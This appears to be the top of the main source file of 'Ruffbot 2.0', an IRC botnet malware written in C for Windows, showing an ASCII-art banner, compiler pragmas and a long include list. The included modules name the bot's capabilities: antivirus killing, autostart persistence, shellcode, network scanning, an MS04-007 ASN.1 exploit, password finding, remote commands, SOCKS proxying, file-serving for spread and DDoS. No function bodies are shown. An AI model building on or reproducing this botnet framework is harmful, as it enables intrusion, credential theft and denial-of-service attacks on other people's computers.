/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


#ifdef WIN32
#define _WIN32_WINNT	0x0403				
#define WIN32_LEAN_AND_MEAN					
#pragma optimize("gsy", on)					
#pragma comment(linker,"/RELEASE")			
#pragma comment(linker, "/ALIGN:4096")		
#pragma comment(linker, "/IGNORE:4108 ")	
								
#endif 

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "ruff.h"
#include "autostart.h"
#include "avirus.h"
#include "defines.h"
#include "threads.h"
#include "processes.h"
#include "loaddlls.h"
#include "irc_send.h"
#include "download.h"
#include "tcpip.h"
#include "ehandler.h"
#include "crc32.h"
#include "netutils.h"
#include "sysinfo.h"
#include "ident.h"
#include "rndnick.h"
#include "socks4.h"
#include "wildcard.h"
#include "misc.h"
#include "driveinfo.h"
#include "dcc.h"
#include "crypt.h"
#include "visit.h"
#include "remotecmd.h"
#include "aliaslog.h"
#include "net.h"
#include "secure.h"
#include "session.h"
#include "rlogind.h"
#include "fphost.h"
#include "shellcode.h"
#include "scan.h"
#include "advscan.h"
#include "findpass.h"
#include "findfile.h"
#include "ftpd.h"
#include "tftpd.h"
#include "httpd.h"
#include "random.h"
#include "ms04_007_asn1.h"
#include "netbios.h"
#include "ddos.h"
